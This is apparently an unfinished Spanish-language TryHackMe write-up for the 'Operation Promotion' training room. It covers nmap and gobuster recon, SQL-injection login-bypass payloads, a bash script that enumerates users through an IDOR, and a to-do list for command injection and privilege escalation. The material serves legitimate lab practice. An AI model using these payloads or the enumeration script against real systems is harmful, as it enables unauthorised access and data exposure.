# TryHackMe — Operation Promotion (RecruitCorp)

**Sala:** Operation Promotion
**Plataforma:** TryHackMe
**Dificultad:** Fácil
**Tema:** Enumeración web · robots.txt · SQL injection (bypass de login) · IDOR · Command injection · Escalada de privilegios
**Objetivo:** Comprometer el portal de reclutamiento de *RecruitCorp*, capturar las 2 flags y demostrar que estás listo para el título de *Penetration Tester*.

> **Resumen en una línea:** el `nmap` destapa el portal web en `:80` y el `robots.txt` delata `/admin/`; el login del panel se salta con SQLi (`admin' -- -`), dentro hay un **IDOR** en `lookup.php?id=` que enumera usuarios (el ID `7` = `sysmaint` apunta a un script de ping con *command injection*), y de ahí se escala hasta `root`.

---

## 0. Información de la máquina

- **IP:** varía según el despliegue de la sala (en las capturas aparece `10.67.163.196`). Usa tu IP actual.
- **Servicios:** `22/tcp` SSH (OpenSSH 9.6p1 Ubuntu), `80/tcp` HTTP (Apache 2.4.58 — **RecruitCorp – Careers Portal**), `139/445/tcp` Samba.
- **Web:** `http://IP/` — `http-robots.txt: 1 disallowed entry`.

---

## 1. Reconocimiento (Nmap)

```bash
nmap -sV -sC -Pn -oN scan_port.txt IP_MACHINA
```

![[Pasted image 20261116120717.png]]

Puertos abiertos:

| Puerto | Servicio | Detalle |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 9.6p1 (Ubuntu 3ubuntu13.16) |
| 80/tcp | HTTP | Apache 2.4.58 — título *RecruitCorp – Careers Portal*; **`robots.txt` con 1 entrada** → `/admin/` |
| 139/445/tcp | Samba | smbd 4.6.2 — NetBIOS name `RECRUITCORP` |

![[Pasted image 20261116120646.png]]

*Salida completa del escaneo (996 puertos TCP cerrados).*

---

## 2. robots.txt — la pista inicial

El propio `nmap` ya avisaba de la entrada deshabilitada; abriéndola en el navegador:

```
User-agent: *
Disallow: /admin/
```

![[Pasted image 20261116122646.png]]

---

## 3. Enumeración de directorios (gobuster)

```bash
gobuster dir -u http://IP_MACHINA -w /usr/share/wordlists/dirb/common.txt -t 50
```

![[Pasted image 20261116122446.png]]

Resultado relevante:

- `/admin` → **301** (redirige a `/admin/`) — misma ruta que `robots.txt`.
- `/robots.txt` → 200.
- `/index.php` → 200.
- El resto (`/.htaccess`, `/.hta`, `/server-status`…) → 403, sin interés.

---

## 4. Panel de administración y bypass del login (SQLi)

Entrando en `http://IP_MACHINA/admin/` aparece el panel **RecruitCorp Admin** con un formulario de acceso interno:

![[Pasted image 20261116122728.png]]

El formulario es vulnerable a **inyección SQL en el campo usuario** (concatenación de la consulta). Basta con romper la condición y comentar el resto; la contraseña da igual:

```
admin' -- -
```

Payload equivalente:

```
' or 1=1 -- -
```

- Indicador de éxito: redirección al panel con cookie `PHPSESSID` nueva (guárdala, la necesitas después).
- Desde el navegador se puede inspeccionar la petición con las *Dev Tools* (pestaña Red) y repetirla con `curl` usando `-H "Cookie: PHPSESSID=..."`.

> Ver `Comando Rapido/SQLmap.md` (sección *Bypass de login*) y `Comando Rapido/Enumeracion web.md`.

---

## 5. IDOR en lookup.php — enumeración de usuarios

Dentro del panel hay una herramienta de búsqueda de usuarios (`/admin/users/lookup.php`) que toma el parámetro `id` **sin comprobar permisos**: cambiando el número accedes a la ficha de cualquier usuario (**IDOR**).

Abriendo la ficha de un usuario con la sesión iniciada se obtiene su perfil; para no ir ID a ID a mano, script de enumeración (`enumera.sh`):

```bash
#!/bin/bash

URL="http://IP_MACHINA/admin/users/lookup.php"
COOKIE="TU_COOKIE_PHPSESSID"

for id in {1..10}; do
    username=$(curl -s -L \
        -H "Cookie: PHPSESSID=$COOKIE" \
        "$URL?id=$id" |
        sed -n 's/.*<th>Username<\/th><td>\(.*\)<\/td>.*/\1/p')

    if [ -n "$username" ]; then
        echo "$username" | tee -a usuarios.txt
    fi
done
```

```bash
bash enumera.sh
```

![[Pasted image 20261116130810.png]]

![[Pasted image 20261116131149.png]]

Usuarios enumerados (`id` 1–10):

| ID | Usuario | Nota |
| --- | --- | --- |
| 1 | `admin` | el que usamos para entrar |
| 2 | `mvasquez` | recruiter |
| 3 | `tparker` | recruiter |
| 4 | `lhayes` | |
| 5 | `kchen` | |
| 6 | `rdavis` | *Owns the EMEA pipeline* |
| 7 | **`sysmaint`** | **cuenta de mantenimiento: su ficha revela `/admin/sysmaint-checks/ping.php`** |
| 8 | `jbailey` | |
| 9 | `okafor` | |

> El detalle clave está en el ID `7` (`sysmaint`): su ficha menciona un script interno de comprobación, `/admin/sysmaint-checks/ping.php`.

---

## 6. Pendiente

- [ ] Explotar el **command injection** de `/admin/sysmaint-checks/ping.php` (salto de línea `%0a`, ver `Comando Rapido/Shells y transferencia.md`) para obtener reverse shell.
- [ ] Leer `app.db` / `db.conf` y crackear el hash (ver `Comando Rapido/Fuerza bruta y crackeo.md`).
- [ ] Entrar por SSH con el usuario crackeado.
- [ ] Escalada a `root` y capturar las **2 flags**.
